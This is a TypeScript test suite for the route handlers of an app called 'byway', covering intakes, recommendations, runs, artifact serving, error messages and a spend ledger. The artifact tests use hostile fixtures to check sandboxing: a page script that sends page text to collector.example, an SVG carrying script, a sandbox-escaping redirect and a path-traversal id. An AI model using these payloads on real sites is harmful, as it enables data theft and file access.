import { readFileSync, writeFileSync } from 'node:fs';
import path from 'node:path';
import { afterEach, describe, expect, it, vi } from 'vitest';
import { GatewayError, type CheckpointRecord, type GatewayErrorCode } from '@byway/contracts';
import { AdvisorError } from '@byway/advisor';
import { heldKeyError } from '@byway/gateway';
import type { Services } from '../src/services/index.ts';
import {
  HttpError,
  addRef,
  checkLedger,
  spendAction,
  spendRecords,
  artifactResponse,
  composeIntake,
  controlRun,
  createIntake,
  currentRecommendation,
  recipeForRun,
  recommendIntake,
  recommendationOrProblem,
  resolveInRun,
  startRun,
  updateSettings,
  type Deps,
  composeCommand,
  recommendCommand,
  workspaceRemaining,
} from '../src/server/api.ts';
import { RecommendInput } from '../src/server/schemas.ts';
import { getRunData } from '../src/server/run-data.ts';
import { FIRST_QUESTION } from './fixtures/runner.ts';
import { TINY_PNG_BASE64, testHost, type TestHost } from './fixtures/services.ts';

let current: TestHost | undefined;

afterEach(async () => {
  await current?.dispose();
  current = undefined;
});

/** The real store, gateway (mock provider), prompts and advisor on a temp data directory, with the fake Runner. */
async function deps(): Promise<Deps> {
  current = testHost();
  const services: Services = current.host.services(true);
  const ws = await services.store.ensureDefaultWorkspace();
  return { services, workspaceId: ws.id, profileId: 'demo', heldKeyIn: current.host.heldKeyIn };
}

/**
 * Every test here runs the real store, gateway and advisor on a fresh data directory, so it creates a database and
 * writes artifact files that are flushed to disk. Alone, a test takes about 0.1 s; with the machine busy (several suites,
 * their Chromium and Temporal servers) the compose test has run past vitest's 5 s default. The limit is realistic for
 * that, and still bounded.
 */
const PRODUCT_PATH = { timeout: 30_000 };

async function openQuestion(d: Deps, runId: string): Promise<CheckpointRecord> {
  const open = (await d.services.runner.view(runId)).checkpoints.find((c) => c.status === 'open');
  if (!open) throw new Error('no open question');
  return open;
}

describe('route handler logic', PRODUCT_PATH, () => {
  it('takes a problem from Start to a recommendation, re-routes on a flipped answer, keeps it, and starts the run', async () => {
    const d = await deps();
    const { intakeId } = await createIntake(d, { text: 'A landing page for my pottery studio' });
    expect(await d.services.store.getIntake(intakeId)).toMatchObject({ workspaceId: d.workspaceId, problem: { text: 'A landing page for my pottery studio' } });
    const rec = await currentRecommendation(d, intakeId);
    expect(rec.recipeId).toBe('c1');

    const flipped = rec.answers.map((a) => (a.questionId === 'visual' ? { ...a, answer: false, setBy: 'user' as const } : a));
    const again = await recommendIntake(d, intakeId, flipped);
    expect(again.recipeId).not.toBe('c1');
    // Coming back to the screen shows the answers as you left them.
    expect((await currentRecommendation(d, intakeId)).recipeId).toBe(again.recipeId);
    expect((await d.services.store.getIntake(intakeId))?.answers?.find((a) => a.questionId === 'visual')).toMatchObject({ answer: false, setBy: 'user' });

    const { runId } = await startRun(d, { intakeId, recipeId: 'c1', budgetUsd: 3 });
    const data = await getRunData(d.services, runId);
    expect(data.view.run).toMatchObject({ recipeId: 'c1', budgetUsd: 3, intakeId, profileId: 'demo' });
  });

  it('checks a library recipe through the advisor', async () => {
    const d = await deps();
    const { intakeId } = await createIntake(d, { text: 'Tighten my quarterly memo', recipeId: 'c4' });
    expect(await d.services.store.getIntake(intakeId)).toBeDefined();
    await expect(createIntake(d, { text: 'x', recipeId: 'c99' })).rejects.toMatchObject({ status: 404 });
  });

  it('composes a recipe, keeps it on the intake and starts it as composed, presentable even after a restart', async () => {
    const d = await deps();
    const { intakeId } = await createIntake(d, { text: 'Tighten my quarterly memo' });
    const composed = await composeIntake(d, intakeId);
    expect(composed.label.scope).toBe('Composed');
    expect(composed.ok).toBe(true);
    expect(composed).not.toHaveProperty('recipe');
    const kept = (await d.services.store.getIntake(intakeId))?.composed;
    expect(kept?.recipe.kind).toBe('composed');
    const { runId } = await startRun(d, { intakeId, budgetUsd: 2 });
    const run = await d.services.store.getRun(runId);
    if (!run) throw new Error('run missing');
    expect(run.intakeId).toBe(intakeId);
    // The run finds its composed recipe through its intake, which the store keeps.
    const shown = await recipeForRun(d, run);
    expect(shown.presentation).toEqual(kept?.presentation);
    expect(shown.label?.scope).toBe('Composed');
    expect(Object.keys(shown.steps ?? {}).length).toBeGreaterThan(0);
    // Without its intake, no label is better than a made-up one.
    expect(await recipeForRun(d, { ...run, intakeId: 'gone' })).toEqual({});
  });

  it('presents library runs from the catalog with a computed label and a step index', async () => {
    const d = await deps();
    const { intakeId } = await createIntake(d, { text: 'A memo', recipeId: 'c4' });
    const { runId } = await startRun(d, { intakeId, recipeId: 'c4', budgetUsd: 2 });
    const run = await d.services.store.getRun(runId);
    if (!run) throw new Error('run missing');
    const shown = await recipeForRun(d, run);
    expect(shown.presentation?.name).toBe('Memo Polish');
    expect(shown.label?.verdict).toBe('Untested');
    const presented = shown.presentation?.stages.flatMap((s) => s.steps.flatMap((step) => step.stepIds)) ?? [];
    expect(presented.length).toBeGreaterThan(0);
    for (const id of presented) expect(shown.steps?.[id]?.label).toBeDefined();
  });

  it('refuses unknown intakes, a missing composed recipe, and budgets over what the workspace has left', async () => {
    const d = await deps();
    await expect(recommendIntake(d, '0b7f2f5e-3c1a-4d2e-9f00-5a3c2b1d4e6f')).rejects.toBeInstanceOf(HttpError);
    const { intakeId } = await createIntake(d, { text: 'A memo' });
    await expect(startRun(d, { intakeId, budgetUsd: 2 })).rejects.toMatchObject({ status: 400 });
    await expect(startRun(d, { intakeId, recipeId: 'c4', budgetUsd: 500 })).rejects.toThrow(/workspace budget/);
  });

  it('resolves a question only within its own run, and passes validation messages through', async () => {
    const d = await deps();
    const { intakeId } = await createIntake(d, { text: 'A landing page', recipeId: 'c1' });
    const { runId } = await startRun(d, { intakeId, recipeId: 'c1', budgetUsd: 5 });
    const cp = await openQuestion(d, runId);
    expect(cp.kind).toBe(FIRST_QUESTION.kind);
    await expect(resolveInRun(d, 'run-other', cp.id, { choice: ['seed'] })).rejects.toMatchObject({ status: 404 });
    await expect(resolveInRun(d, runId, cp.id, { choice: ['nope'] })).rejects.toMatchObject({ status: 400 });
    await resolveInRun(d, runId, cp.id, { choice: ['seed'] });
    const after = (await d.services.runner.view(runId)).checkpoints.find((c) => c.id === cp.id);
    expect(after?.status).toBe('resolved');
    await expect(resolveInRun(d, runId, cp.id, { choice: ['seed'] })).rejects.toMatchObject({ status: 409, message: 'That question has already been answered.' });
  });

  it('says a question was withdrawn, not answered, when its run ended while it was open (API-1)', async () => {
    const d = await deps();
    const { intakeId } = await createIntake(d, { text: 'A landing page', recipeId: 'c1' });
    const { runId } = await startRun(d, { intakeId, recipeId: 'c1', budgetUsd: 5 });
    const cp = await openQuestion(d, runId);
    await controlRun(d, runId, 'cancel');
    await d.services.store.withdrawCheckpoints(runId);
    await expect(resolveInRun(d, runId, cp.id, { choice: ['seed'] })).rejects.toMatchObject({
      status: 409,
      message: 'This question was withdrawn: its run was cancelled or failed.',
    });
  });

  it('pauses, resumes and cancels runs through the runner, and leaves ended runs alone', async () => {
    const d = await deps();
    const { intakeId } = await createIntake(d, { text: 'A memo', recipeId: 'c4' });
    const { runId } = await startRun(d, { intakeId, recipeId: 'c4', budgetUsd: 2 });
    await controlRun(d, runId, 'pause');
    expect((await d.services.store.getRun(runId))?.status).toBe('paused');
    await controlRun(d, runId, 'resume');
    expect((await d.services.store.getRun(runId))?.status).not.toBe('paused');
    await controlRun(d, runId, 'cancel');
    expect((await d.services.runner.view(runId)).run.status).toBe('cancelled');
    await expect(controlRun(d, runId, 'resume')).rejects.toMatchObject({ status: 409 });
    await expect(controlRun(d, 'run-missing', 'cancel')).rejects.toMatchObject({ status: 404 });
  });

  it('saves the profile, demo mode and technical names as Store preferences, and refuses unknown profiles', async () => {
    const d = await deps();
    const next = await updateSettings(d, { profileId: 'best', workspaceBudgetUsd: 50, showTechnicalNames: true });
    expect(next).toEqual({ profileId: 'best', demoMode: false, showTechnicalNames: true });
    expect(await d.services.store.getPreferences(d.workspaceId)).toEqual(next);
    expect((await d.services.store.getWorkspace(d.workspaceId))?.budgetUsd).toBe(50);
    await expect(updateSettings(d, { profileId: 'nope' })).rejects.toMatchObject({ status: 400 });
  });
});

describe('examples you admire (ADR-0071)', PRODUCT_PATH, () => {
  it('stores pasted text and images, and passes them to the run as inputs.refs', async () => {
    const d = await deps();
    const text = await addRef(d, { text: '  A memo I admire.  ' });
    expect(text.mediaType).toBe('text/markdown');
    expect(await d.services.store.artifacts.getText(text.artifactId)).toBe('A memo I admire.');
    const image = await addRef(d, { image: { mediaType: 'image/png', base64: TINY_PNG_BASE64 } });
    expect(image.mediaType).toBe('image/png');

    const { intakeId } = await createIntake(d, { text: 'A memo', recipeId: 'c4' });
    const start = vi.spyOn(d.services.runner, 'start');
    await startRun(d, { intakeId, recipeId: 'c4', budgetUsd: 2, refs: [text.artifactId, image.artifactId, text.artifactId] });
    expect(start.mock.calls[0]?.[0]).toMatchObject({ intakeId, inputs: { refs: [text.artifactId, image.artifactId] } });
  });

  it('refuses images that are not what they claim, examples that were never stored, and examples for a recipe without them', async () => {
    const d = await deps();
    const svg = Buffer.from('<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>').toString('base64');
    await expect(addRef(d, { image: { mediaType: 'image/png', base64: svg } })).rejects.toMatchObject({ status: 400 });
    await expect(addRef(d, { image: { mediaType: 'image/jpeg', base64: TINY_PNG_BASE64 } })).rejects.toMatchObject({ status: 400 });

    const { intakeId } = await createIntake(d, { text: 'A landing page', recipeId: 'c1' });
    const ref = await addRef(d, { text: 'A page I admire.' });
    await expect(startRun(d, { intakeId, recipeId: 'c1', budgetUsd: 2, refs: [ref.artifactId] })).rejects.toThrow(/does not use examples/);
    await expect(startRun(d, { intakeId, recipeId: 'c4', budgetUsd: 2, refs: [`sha256:${'0'.repeat(64)}`] })).rejects.toThrow(/not found/);
  });
});

describe('the artifact route', PRODUCT_PATH, () => {
  it('serves stored artifacts with their headers, as downloads on request, and refuses bad ids', async () => {
    const d = await deps();
    const page = await d.services.store.artifacts.putText('<!doctype html><title>x</title>', 'text/html');
    const res = await artifactResponse(d.services, encodeURIComponent(page.id), new URL(`http://127.0.0.1:3000/artifacts/${page.id}`));
    expect(res.status).toBe(200);
    // Inert at its own address: opened directly, a page runs no scripts (F05).
    expect(res.headers.get('content-security-policy')).toMatch(/(^|; )sandbox$/);
    expect(await res.text()).toContain('<title>x</title>');

    // The CSP names the origin the browser used, even when the request URL was normalised to localhost.
    const viaLoopback = await artifactResponse(d.services, page.id, new URL(`http://localhost:3000/artifacts/${page.id}`), 'http://127.0.0.1:3000');
    expect(viaLoopback.headers.get('content-security-policy')).toContain('img-src http://127.0.0.1:3000/artifacts/');

    const dl = await artifactResponse(d.services, page.id, new URL(`http://127.0.0.1:3000/artifacts/${page.id}?download=1&name=My%20page`));
    expect(dl.headers.get('content-disposition')).toBe('attachment; filename="my-page.html"');

    expect((await artifactResponse(d.services, 'sha256:..%2F..%2Fsecrets', new URL('http://127.0.0.1:3000/x'))).status).toBe(400);
    expect((await artifactResponse(d.services, `sha256:${'0'.repeat(64)}`, new URL('http://127.0.0.1:3000/x'))).status).toBe(404);
  });

  it('runs a page’s scripts only for ?scripts=1 asked by a same-origin frame, never cached; every other request is inert (F05)', async () => {
    const d = await deps();
    const page = await d.services.store.artifacts.putText('<!doctype html><script>location.href="http://collector.example/?d="+document.body.innerText</script>', 'text/html');
    const at = (query: string, headers: Record<string, string>) =>
      artifactResponse(d.services, page.id, new URL(`http://127.0.0.1:3000/artifacts/${page.id}${query}`), 'http://127.0.0.1:3000', 'artifacts', new Headers(headers));
    const frame = { 'sec-fetch-dest': 'iframe', 'sec-fetch-site': 'same-origin' };

    const granted = await at('?scripts=1', frame);
    expect(granted.status).toBe(200);
    expect(granted.headers.get('content-security-policy')).toMatch(/(^|; )sandbox allow-scripts$/);
    expect(granted.headers.get('cache-control')).toBe('no-store');

    const inert: [string, Record<string, string>][] = [
      ['?scripts=1', { 'sec-fetch-dest': 'document', 'sec-fetch-site': 'same-origin' }],
      ['?scripts=1', { 'sec-fetch-dest': 'document', 'sec-fetch-site': 'none' }],
      ['?scripts=1', {}],
      ['?scripts=1', { 'sec-fetch-dest': 'iframe', 'sec-fetch-site': 'cross-site' }],
      ['', frame],
      ['?download=1&scripts=1', frame],
    ];
    for (const [query, headers] of inert) {
      const res = await at(query, headers);
      const csp = res.headers.get('content-security-policy') ?? '';
      expect(csp, `${query} ${JSON.stringify(headers)}`).toMatch(/(^|; )sandbox$/);
      expect(csp).not.toContain('allow-scripts');
    }
    // The default address never depends on request headers, so it keeps its long cache; an ask for scripts is never cached.
    expect((await at('', frame)).headers.get('cache-control')).toContain('immutable');
    expect((await at('?scripts=1', {})).headers.get('cache-control')).toBe('no-store');
    // The media route never serves a page, whatever is asked.
    expect((await artifactResponse(d.services, page.id, new URL(`http://127.0.0.1:3000/api/artifacts/${page.id}?scripts=1`), 'http://127.0.0.1:3000', 'media', new Headers(frame))).status).toBe(404);
  });

  it('serves only media at /api/artifacts, so a generated page cannot move itself to an address without its sandbox (SEC-1)', async () => {
    const d = await deps();
    const media = (id: string) => artifactResponse(d.services, id, new URL(`http://127.0.0.1:3000/api/artifacts/${id}`), 'http://127.0.0.1:3000', 'media');
    const page = await d.services.store.artifacts.putText('<!doctype html><script>location.replace("/api"+location.pathname)</script>', 'text/html');
    const pageRes = await media(page.id);
    expect(pageRes.status).toBe(404);
    expect(pageRes.headers.get('content-type')).not.toContain('text/html');

    // An SVG can carry script: it still loads in an <img>, but opening it downloads it instead of running it.
    const svg = await d.services.store.artifacts.putText('<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>', 'image/svg+xml');
    const svgRes = await media(svg.id);
    expect(svgRes.status).toBe(200);
    expect(svgRes.headers.get('content-disposition')).toMatch(/^attachment/);
    expect(svgRes.headers.get('content-security-policy')).toMatch(/sandbox(;|$)/);

    const png = await d.services.store.artifacts.put(Buffer.from(TINY_PNG_BASE64, 'base64'), 'image/png');
    const pngRes = await media(png.id);
    expect(pngRes.status).toBe(200);
    expect(pngRes.headers.get('content-type')).toBe('image/png');
    expect(pngRes.headers.get('content-disposition')).toBeNull();

    const text = await d.services.store.artifacts.putText('# Notes', 'text/markdown');
    expect((await media(text.id)).status).toBe(404);
  });
});

describe('model errors while recommending or composing (UX-2)', PRODUCT_PATH, () => {
  const gatewayError = (code: GatewayErrorCode, scope?: 'workspace' | 'run') =>
    Object.assign(new GatewayError(code, `${code} from the provider`), scope ? { budget: { scope, capUsd: 5, spentUsd: 5, reservedUsd: 0, estimateUsd: 0.1, shortfallUsd: 0.1 } } : {});

  it('says what went wrong and what to do, with a status that matches', async () => {
    const d = await deps();
    const { intakeId } = await createIntake(d, { text: 'A memo' });
    const recommend = vi.spyOn(d.services.advisor, 'recommend');
    const cases: [Error, number, RegExp][] = [
      [gatewayError('no-credentials'), 400, /key/],
      [gatewayError('budget-exceeded', 'workspace'), 400, /workspace budget.*Settings/],
      [gatewayError('rate-limited'), 503, /busy/],
      [gatewayError('provider-error'), 503, /did not answer/],
      // ADR-0095: a line of the ledger the spend book cannot read pauses paid calls until the person acknowledges it.
      [gatewayError('accounting-fault'), 409, /cannot read.*Settings, Spending records/],
      // byway's own failures (follow-up (e)): a billed call it could not keep says it was paid for; a call it did not start says so.
      [new GatewayError('byway-failure', 'anthropic answered and billed this call (advisor.intake), but byway could not record its cost', false, { billed: true }), 500, /paid for.*Spending records.*pays for, a new call/],
      [new GatewayError('byway-failure', 'byway is stopping, so it did not start this call. Try again once it has started again.', true, { billed: false }), 503, /^byway is stopping, so it did not start this call/],
      [new AdvisorError('intake-unreadable', 'unreadable'), 502, /could not read/],
      // A held key (ADR-0088): the gateway's own message, which names the variable and says what to do.
      [heldKeyError('invalid-request', 'This request contains your ANTHROPIC_API_KEY. byway never sends a key to a model; remove it from the material and try again.', 'ANTHROPIC_API_KEY'), 400, /^This request contains your ANTHROPIC_API_KEY\. .*remove it/],
      [heldKeyError('provider-error', 'anthropic answered and billed this call (intake), but its answer contained your ANTHROPIC_API_KEY, so byway did not use it.', 'ANTHROPIC_API_KEY'), 502, /^anthropic answered and billed this call .*did not use it/],
    ];
    for (const [err, status, message] of cases) {
      recommend.mockRejectedValueOnce(err);
      await expect(recommendIntake(d, intakeId)).rejects.toMatchObject({ status, message: expect.stringMatching(message) });
    }
    const compose = vi.spyOn(d.services.advisor, 'compose');
    compose.mockRejectedValueOnce(new AdvisorError('compose-unreadable', 'unreadable'));
    await expect(composeIntake(d, intakeId)).rejects.toMatchObject({ status: 502, message: expect.stringMatching(/build a recipe/) });
    // Anything else is not dressed up as a model problem.
    recommend.mockRejectedValueOnce(new TypeError('a bug'));
    await expect(recommendIntake(d, intakeId)).rejects.toBeInstanceOf(TypeError);
  });

  it('gives the Recommendation screen a problem to show instead of failing to load', async () => {
    const d = await deps();
    const { intakeId } = await createIntake(d, { text: 'A memo' });
    vi.spyOn(d.services.advisor, 'recommend').mockRejectedValueOnce(gatewayError('rate-limited'));
    const first = await recommendationOrProblem(d, intakeId);
    expect(first).toEqual({ problem: expect.stringMatching(/busy/) });
    const second = await recommendationOrProblem(d, intakeId);
    expect('recommendation' in second && second.recommendation.recipeId).toBeTruthy();
  });
});

describe('Recommendation screen commands return everything they change (F14, ADR-0082)', PRODUCT_PATH, () => {
  const rateLimited = () => new GatewayError('rate-limited', 'rate-limited from the provider');

  it('Try again ({ ensure: true }) makes and stores the recommendation once, and says what is left in the workspace', async () => {
    const d = await deps();
    const { intakeId } = await createIntake(d, { text: 'A landing page for my pottery studio' });
    const recommend = vi.spyOn(d.services.advisor, 'recommend');
    recommend.mockRejectedValueOnce(rateLimited());
    expect(await recommendationOrProblem(d, intakeId)).toEqual({ problem: expect.stringMatching(/busy/) });
    expect(recommend).toHaveBeenCalledTimes(1);

    const first = await recommendCommand(d, intakeId, { ensure: true });
    expect(first.recommendation.recipeId).toBe('c1');
    expect((await d.services.store.getIntake(intakeId))?.recommendation?.recipeId).toBe('c1');
    expect(first.remainingUsd).toBe((await workspaceRemaining(d)).remainingUsd);
    // Asking again returns the stored one: no second model call.
    const second = await recommendCommand(d, intakeId, { ensure: true });
    expect(second.recommendation).toEqual(first.recommendation);
    expect(recommend).toHaveBeenCalledTimes(2);
  });

  it('re-routing with flipped answers still works through the same command', async () => {
    const d = await deps();
    const { intakeId } = await createIntake(d, { text: 'A landing page for my pottery studio' });
    const { recommendation } = await recommendCommand(d, intakeId, { ensure: true });
    const answers = recommendation.answers.map((a) => (a.questionId === 'visual' ? { ...a, answer: false, setBy: 'user' as const } : a));
    const next = await recommendCommand(d, intakeId, { answers });
    expect(next.recommendation.recipeId).not.toBe('c1');
    expect(typeof next.remainingUsd).toBe('number');
  });

  it('Build my own during a failure asks the model for no recommendation, stores none, and says what is left', async () => {
    const d = await deps();
    const { intakeId } = await createIntake(d, { text: 'Tighten my quarterly memo' });
    const recommend = vi.spyOn(d.services.advisor, 'recommend');
    recommend.mockRejectedValueOnce(rateLimited());
    await recommendationOrProblem(d, intakeId);
    const calls = recommend.mock.calls.length;
    const result = await composeCommand(d, intakeId);
    expect(result.composed.ok).toBe(true);
    expect(result.remainingUsd).toBe((await workspaceRemaining(d)).remainingUsd);
    expect(recommend.mock.calls.length).toBe(calls);
    expect((await d.services.store.getIntake(intakeId))?.recommendation).toBeUndefined();
  });

  it('reports the remaining amount as it is now, a raised cap included', async () => {
    const d = await deps();
    const before = await workspaceRemaining(d);
    await updateSettings(d, { workspaceBudgetUsd: before.capUsd + 30 });
    const after = await workspaceRemaining(d);
    expect(after.remainingUsd).toBeCloseTo(before.remainingUsd + 30, 2);
    expect(after.workspaceId).toBe(d.workspaceId);
  });

  it('accepts exactly two request bodies: { ensure: true } or { answers }; an empty body is still refused', () => {
    expect(RecommendInput.safeParse({ ensure: true }).success).toBe(true);
    expect(RecommendInput.safeParse({ answers: [] }).success).toBe(true);
    expect(RecommendInput.safeParse({}).success).toBe(false);
    expect(RecommendInput.safeParse({ ensure: false }).success).toBe(false);
    expect(RecommendInput.safeParse({ ensure: 'yes' }).success).toBe(false);
  });
});

describe('exports carry their images (EXP-1)', PRODUCT_PATH, () => {
  it('inlines byway-served images into a downloaded page or Markdown file, so it works away from byway', async () => {
    const d = await deps();
    const png = await d.services.store.artifacts.put(Buffer.from(TINY_PNG_BASE64, 'base64'), 'image/png');
    const encoded = png.id.replace(':', '%3A');
    const md = await d.services.store.artifacts.putText(`# Cycling\n\n![A bike](/api/artifacts/${png.id})\n\n![Again](/artifacts/${encoded})\n`, 'text/markdown');
    const res = await artifactResponse(d.services, md.id, new URL(`http://127.0.0.1:3000/artifacts/${md.id}?download=1&name=Cycling`));
    const body = await res.text();
    expect(res.headers.get('content-disposition')).toBe('attachment; filename="cycling.md"');
    expect(body).not.toContain('/artifacts/');
    expect(body).toContain(`![A bike](data:image/png;base64,${TINY_PNG_BASE64})`);
    expect(body).toContain(`![Again](data:image/png;base64,${TINY_PNG_BASE64})`);

    const page = await d.services.store.artifacts.putText(`<!doctype html><img src="/api/artifacts/${png.id}" alt="x">`, 'text/html');
    const html = await (await artifactResponse(d.services, page.id, new URL(`http://127.0.0.1:3000/artifacts/${page.id}?download=1`))).text();
    expect(html).toBe(`<!doctype html><img src="data:image/png;base64,${TINY_PNG_BASE64}" alt="x">`);
    // Viewing (not downloading) serves the stored bytes as they are.
    expect(await (await artifactResponse(d.services, page.id, new URL(`http://127.0.0.1:3000/artifacts/${page.id}`))).text()).toContain('/api/artifacts/');
  });

  it('leaves a reference it cannot inline as it was (missing, or not an image or clip)', async () => {
    const d = await deps();
    const missing = `sha256:${'1'.repeat(64)}`;
    const note = await d.services.store.artifacts.putText('a note', 'text/markdown');
    const md = await d.services.store.artifacts.putText(`![gone](/api/artifacts/${missing}) [note](/artifacts/${note.id})`, 'text/markdown');
    const body = await (await artifactResponse(d.services, md.id, new URL(`http://127.0.0.1:3000/artifacts/${md.id}?download=1`))).text();
    expect(body).toBe(`![gone](/api/artifacts/${missing}) [note](/artifacts/${note.id})`);
  });
});

describe('Settings: checking the spend ledger on demand (ADR-0091)', PRODUCT_PATH, () => {
  it('says the ledger checks out, then names the damage once a line is broken', async () => {
    const d = await deps();
    const { intakeId } = await createIntake(d, { text: 'A landing page for my pottery studio' });
    await currentRecommendation(d, intakeId);
    expect(await checkLedger(d)).toEqual({ intact: true, message: expect.stringMatching(/checks out/) });
    const file = path.join(current!.dataDir, 'ledger.jsonl');
    writeFileSync(file, `{not an entry\n${readFileSync(file, 'utf8')}`);
    expect(await checkLedger(d)).toEqual({ intact: false, message: expect.stringMatching(/^Line 1 of the spend ledger cannot be read/) });
  });
});

describe('Settings: Spending records (F03, ADR-0095)', PRODUCT_PATH, () => {
  /** A call admitted and sent in the spend book whose answer never came: it may have been billed. */
  async function interruptedCall(d: Deps, usd: number): Promise<string> {
    const book = d.services.store.spendBook;
    const opId = `op-${Math.random().toString(36).slice(2)}`;
    await book.admit({ opId, owner: 'gone', leaseMs: 60_000, workspaceId: d.workspaceId, purpose: 'advisor.intake', kind: 'completion', provider: 'anthropic', model: 'claude-opus-5-5', reserveUsd: usd, paid: true, caps: { workspaceUsd: 1000 } });
    await book.markSent(opId, 'gone');
    await book.abandon(opId);
    return opId;
  }

  it('lists a call that may have been billed, counts it against what is left, and clears it', async () => {
    const d = await deps();
    const before = await workspaceRemaining(d);
    const opId = await interruptedCall(d, 0.5);
    const { records, spend } = await spendRecords(d);
    expect(records.uncertain).toEqual([expect.objectContaining({ opId, usd: 0.5, reason: 'failed', provider: 'anthropic', purpose: 'advisor.intake' })]);
    expect(spend).toMatchObject({ uncertainUsd: 0.5, remainingUsd: before.remainingUsd - 0.5 });
    const cleared = await spendAction(d, { clear: [opId] });
    expect(cleared.records.uncertain).toEqual([]);
    expect(cleared.spend.remainingUsd).toBe(before.remainingUsd);
    // A second click finds nothing left to clear.
    expect((await spendAction(d, { clear: [opId] })).records.uncertain).toEqual([]);
  });

  it('pauses paid calls on a line of the ledger it cannot read, names it, and lets them go on once acknowledged; demo calls go on meanwhile', async () => {
    const d = await deps();
    const { intakeId } = await createIntake(d, { text: 'A landing page for my pottery studio' });
    await currentRecommendation(d, intakeId);
    const file = path.join(current!.dataDir, 'ledger.jsonl');
    writeFileSync(file, `{"workspaceId":"x"}\n${readFileSync(file, 'utf8')}`);
    const { records } = await spendRecords(d);
    expect(records.faults).toEqual([expect.objectContaining({ detail: expect.stringMatching(/byte 0 of ledger\.jsonl/) })]);
    const paid = await d.services.store.spendBook.admit({ opId: 'paid-1', owner: 'me', leaseMs: 60_000, workspaceId: d.workspaceId, purpose: 'advisor.intake', kind: 'completion', provider: 'anthropic', model: 'claude-opus-5-5', reserveUsd: 0.1, paid: true, caps: { workspaceUsd: 1000 } });
    expect(paid).toEqual({ fault: expect.stringMatching(/Settings/) });
    // The demo's calls cost nothing, so they go on.
    await expect(recommendIntake(d, intakeId)).resolves.toMatchObject({ recipeId: expect.any(String) });
    expect(await checkLedger(d)).toEqual({ intact: false, message: expect.stringMatching(/^Line 1 of the spend ledger cannot be read as an entry\. .*Spending records/) });
    const after = await spendAction(d, { acknowledge: records.faults[0]!.id });
    expect(after.records.faults).toEqual([]);
    expect(await d.services.store.spendBook.admit({ opId: 'paid-2', owner: 'me', leaseMs: 60_000, workspaceId: d.workspaceId, purpose: 'advisor.intake', kind: 'completion', provider: 'anthropic', model: 'claude-opus-5-5', reserveUsd: 0.1, paid: true, caps: { workspaceUsd: 1000 } })).toEqual({ admitted: true });
  });

  it('notes a torn ledger tail that was set aside, and settled calls not yet in the ledger', async () => {
    const d = await deps();
    writeFileSync(path.join(current!.dataDir, 'ledger.jsonl.damaged-20261008T120000000Z-77'), '{"workspaceId":"ws","cost');
    const { records } = await spendRecords(d);
    expect(records.setAside).toEqual(['ledger.jsonl.damaged-20261008T120000000Z-77']);
    expect(records.notInAuditFile).toBe(0);
  });
});

describe('the first recommendation is asked for once per intake (F03, ADR-0091)', PRODUCT_PATH, () => {
  const intakeCalls = () =>
    readFileSync(path.join(current!.dataDir, 'ledger.jsonl'), 'utf8')
      .trim()
      .split('\n')
      .map((l) => JSON.parse(l) as { purpose: string })
      .filter((e) => e.purpose === 'advisor.intake').length;

  it('two first loads of one intake at once share one advisor call and one ledger entry', async () => {
    const d = await deps();
    const { intakeId } = await createIntake(d, { text: 'A landing page for my pottery studio' });
    const recommend = vi.spyOn(d.services.advisor, 'recommend');
    const [a, b] = await Promise.all([recommendationOrProblem(d, intakeId), recommendationOrProblem(d, intakeId)]);
    expect(a).toEqual(b);
    expect(recommend).toHaveBeenCalledTimes(1);
    expect(intakeCalls()).toBe(1);
    // Later loads read the stored one.
    await recommendationOrProblem(d, intakeId);
    expect(recommend).toHaveBeenCalledTimes(1);
  });

  it('a page load and Try again ({ ensure: true }) at once share the call too', async () => {
    const d = await deps();
    const { intakeId } = await createIntake(d, { text: 'Tighten my quarterly memo' });
    const recommend = vi.spyOn(d.services.advisor, 'recommend');
    const [page, command] = await Promise.all([recommendationOrProblem(d, intakeId), recommendCommand(d, intakeId, { ensure: true })]);
    expect('recommendation' in page && page.recommendation).toEqual(command.recommendation);
    expect(recommend).toHaveBeenCalledTimes(1);
    expect(intakeCalls()).toBe(1);
  });

  it('shares a failure with the loads that joined it, keeps nothing, and the next load asks again', async () => {
    const d = await deps();
    const { intakeId } = await createIntake(d, { text: 'A memo' });
    const recommend = vi.spyOn(d.services.advisor, 'recommend');
    recommend.mockRejectedValueOnce(new GatewayError('rate-limited', 'rate-limited from the provider'));
    const both = await Promise.all([recommendationOrProblem(d, intakeId), recommendationOrProblem(d, intakeId)]);
    expect(both).toEqual([{ problem: expect.stringMatching(/busy/) }, { problem: expect.stringMatching(/busy/) }]);
    expect(recommend).toHaveBeenCalledTimes(1);
    expect('recommendation' in (await recommendationOrProblem(d, intakeId))).toBe(true);
    expect(recommend).toHaveBeenCalledTimes(2);
  });

  it('does not share between intakes', async () => {
    const d = await deps();
    const one = await createIntake(d, { text: 'A landing page for my pottery studio' });
    const two = await createIntake(d, { text: 'Tighten my quarterly memo' });
    const recommend = vi.spyOn(d.services.advisor, 'recommend');
    await Promise.all([currentRecommendation(d, one.intakeId), currentRecommendation(d, two.intakeId)]);
    expect(recommend).toHaveBeenCalledTimes(2);
  });
});
